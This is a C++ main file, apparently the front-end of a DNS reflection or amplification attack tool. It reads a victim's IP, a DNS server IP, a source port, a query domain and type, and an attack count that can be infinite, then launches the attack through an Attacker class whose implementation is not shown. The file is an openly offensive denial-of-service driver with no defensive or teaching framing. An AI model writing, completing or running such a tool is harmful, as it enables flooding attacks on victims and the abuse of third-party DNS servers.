#include <string.h>
#include <iostream>
#include <string>
#include "./attack.h"
#include "./util.h"
#define read(buff) std::getline(std::cin, buff)
#define bar() printf("########################################\n")

int main() {
    std::string readed;
    Attacker atk;

    printf("Victim's IP: ");
    read(readed);
    atk.vctip = stoip(readed.c_str());

    printf("DNS server's ip: ");
    read(readed);
    atk.dnssvrip = stoip(readed.c_str());

    printf("Source port: ");
    read(readed);
    atk.srcport = atoi(readed.c_str());

    printf("Domain to be queried: ");
    read(readed);
    atk.domain = readed;

    printf("DNS type: ");
    read(readed);
    atk.dnstyp = atoi(readed.c_str());

    int time = 0;
    printf("Count of attack (non-positive number indicating infinite): ");
    read(readed);
    time = atoi(readed.c_str());

    bar();
    printf("%-18s %s\n", "Attack count:",
           time > 0 ? std::to_string(time).c_str() : "infinite");
    printf("%-18s %s # %d\n", "Victim:", iptos(atk.vctip).c_str(), atk.srcport);
    printf("%-18s %s\n", "DNS server:", iptos(atk.dnssvrip).c_str());
    printf("%-18s %s\n", "Domain queried:", atk.domain.c_str());
    printf("%-18s %d\n", "DNS type:", atk.dnstyp);
    printf("%-18s %d\n", "DNS class:", atk.dnsclz);
    bar();
    atk.attack(time);
}